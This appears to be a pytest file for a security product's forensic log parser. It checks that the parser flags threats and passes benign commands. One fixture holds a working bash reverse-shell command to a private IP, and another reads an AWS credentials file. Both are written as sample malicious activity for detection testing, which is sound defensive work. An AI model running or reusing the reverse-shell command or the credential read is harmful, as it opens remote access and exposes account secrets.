"""
Unit tests for Standalone Lightweight Fallback Parser (`src/blackwall/enterprise/forensics/fallback_parser.py`).
"""

import pytest
from blackwall.enterprise.forensics.fallback_parser import LightweightForensicParser


def test_fallback_parser_reverse_shell():
    parser = LightweightForensicParser()
    log_data = {
        "command": "/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
        "pid": 4810,
    }
    report = parser.parse(log_data)
    assert report["is_threat"] is True
    assert report["threat_level"] == "CRITICAL"
    assert report["mode"] == "standalone_fallback"
    assert "reverse_shell" in report["categories"]


def test_fallback_parser_credential_exfiltration():
    parser = LightweightForensicParser()
    log_data = {
        "action": "read_file",
        "path": "/home/user/.aws/credentials",
        "pid": 5102,
    }
    report = parser.parse(log_data)
    assert report["is_threat"] is True
    assert report["threat_level"] == "HIGH"
    assert "credential_access" in report["categories"]


def test_fallback_parser_benign_log():
    parser = LightweightForensicParser()
    log_data = {
        "command": "python3 -m unittest discover",
        "pid": 1200,
    }
    report = parser.parse(log_data)
    assert report["is_threat"] is False
    assert report["threat_level"] == "LOW"
    assert report["mode"] == "standalone_fallback"


def test_fallback_parser_100_percent_availability():
    """Verify 100% availability of standalone parser with zero network/GPU dependency."""
    parser = LightweightForensicParser()
    for i in range(100):
        report = parser.parse({"log_id": i, "command": f"test_cmd_{i}"})
        assert "is_threat" in report
        assert report["mode"] == "standalone_fallback"
